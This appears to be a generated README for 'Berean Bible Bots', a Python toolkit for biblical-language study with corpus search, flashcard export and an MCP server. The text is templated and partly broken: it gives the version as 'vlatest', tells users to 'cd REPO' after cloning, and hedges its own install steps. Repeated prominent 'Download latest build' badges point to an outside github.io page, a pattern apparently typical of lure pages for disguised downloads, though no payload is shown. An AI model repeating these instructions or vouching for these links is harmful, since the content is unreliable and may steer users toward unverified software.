# Berean Bible Bots vlatest - Biblical Language Study and Linguistic Analysis 2026

> **Berean Bible Bots is a Python toolkit for querying biblical texts, studying Hebrew, Greek, and Aramaic, and exploring morphology and language patterns across major biblical corpora.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vlatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/dhuber16/berean-bible-bots-toolkit?style=flat-square)](https://github.com/dhuber16/berean-bible-bots-toolkit)

---

<p align="center">
  <a href="https://dhuber16.github.io/berean-bible-bots-toolkit/">
    <img src="https://img.shields.io/badge/Download-Berean%20Bible%20Bots%20Latest-brightgreen?style=for-the-badge" alt="Download Berean Bible Bots">
  </a>
</p>

> **[Direct Download - Berean Bible Bots latest build](https://dhuber16.github.io/berean-bible-bots-toolkit/)**

---

[Download Latest Build](https://dhuber16.github.io/berean-bible-bots-toolkit/)

---

## What Is Berean Bible Bots?

Berean Bible Bots packages a set of Python utilities for original-language Bible work and side-by-side reading of major textual traditions. You can move from corpus search to morphology, semantics, and wider linguistic pattern work in biblical Hebrew, Greek, and Aramaic without stitching together unrelated apps.

The audience is anyone who needs depth beyond a plain verse lookup: learners, instructors, academic users, and structured personal study. One toolkit ties together text queries, guided language practice, notebook exploration, literature search, and flashcard export.

---

## What You Can Do

- Hit multiple supported biblical corpora through the project API.
- Inspect morphology, meaning, and linguistic structure in the passages you care about.
- Focus study on the Hebrew Old Testament and the Greek New Testament.
- Align and check Septuagint vocabulary for consistency across contexts.
- Work with Aramaic sources such as the Peshitta and the Targumim.
- Run interactive lessons and practice drills.
- Build decks aimed at Anki and Flashcards Deluxe.
- Open sample workflows in Jupyter or Google Colab.
- Find related biblical-studies writing via semantic search.
- Expose the stack as an MCP server for clients that speak that protocol.

---

## Installation

Clone the repo and move into the project folder:

```bash
git clone https://github.com/dhuber16/berean-bible-bots-toolkit.git
cd REPO
```

Create a virtual environment, then activate it:

```bash
python -m venv .venv
```

macOS / Linux:

```bash
source .venv/bin/activate
```

Windows PowerShell:

```powershell
.venv\Scripts\Activate.ps1
```

If the tree ships a requirements file, install from it:

```bash
python -m pip install -r requirements.txt
```

Start from the Python entry point or notebook that matches your task. For interactive sessions, open a Jupyter notebook in-tree or continue in Google Colab.

---

## Usage

A common path through the tools looks like this:

1. Choose the corpus or language track you need.
2. Search a verse range, lemma, or related term set.
3. Read the morphological and semantic detail returned.
4. Cross-check Hebrew, Greek, and Aramaic materials where useful.
5. Consult Septuagint alignments or linked secondary literature.
6. Export vocabulary into an Anki or Flashcards Deluxe deck.
7. Push further analysis in Jupyter or Colab.

From the project root, notebooks start with:

```bash
jupyter notebook
```

For MCP use, point a compatible client at this repository’s MCP server entry using the launch and config files shipped with the release.

---

## Configuration

Settings live in the project’s Python config, env files, and any notebook or MCP client setup you use. Keep secrets and host-specific paths out of git.

Example local env fragment:

```ini
# .env
BIBLE_BOTS_DATA_DIR=/path/to/local/data
BIBLE_BOTS_LOG_LEVEL=INFO
```

Prefer names and entry points documented for your build. If a variable is ignored, confirm it against repo docs and startup logs before adding more keys.

---

## Requirements

- A Python runtime that matches the release you installed.
- A desktop environment suitable for local Python and notebooks.
- Disk space for corpora, study assets, and any decks you generate.
- Jupyter if you want local notebook sessions (optional).
- Google Colab if you prefer hosted notebooks (optional).
- An MCP-capable client when you use the MCP server path.
- Network or file access to whatever external data or literature each tool expects.

---

## FAQ

### Who should use Berean Bible Bots?

People studying or teaching biblical Hebrew, Greek, and Aramaic, plus researchers who need corpus-level access to related texts and study aids.

### Is more than one biblical language covered?

Yes. Biblical Hebrew, biblical Greek, and biblical Aramaic are in scope, with supporting material for the Septuagint, Peshitta, and Targumim.

### How do I stay on the newest build?

Grab the latest build or pull current git history, then reinstall or refresh dependencies inside your active virtualenv.

### Where do local options belong?

Use supported config files or environment variables. Do not commit machine paths, tokens, or other private values.

### A query or notebook stopped working—what next?

Check that the venv is active, packages are installed, required data is present, and you launched the entry point that matches this tree. The terminal or notebook traceback usually names the missing piece.

### Can I export flashcards?

Deck generation targets Anki and Flashcards Deluxe. Exact export paths depend on the tool and on the language or corpus in use.

### Do notebooks require a full local install?

Jupyter and Google Colab are both supported workflows. Hosted sessions may still need dependency setup and data access configured.

---

## Roadmap

Areas under consideration for later work:

- Wider multi-corpus query coverage.
- Richer morphological and semantic datasets.
- More interactive language practice.
- Deeper alignment and consistency checks across biblical translations.
- Smoother notebook, Colab, and MCP integration.
- Extra export targets for study decks.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
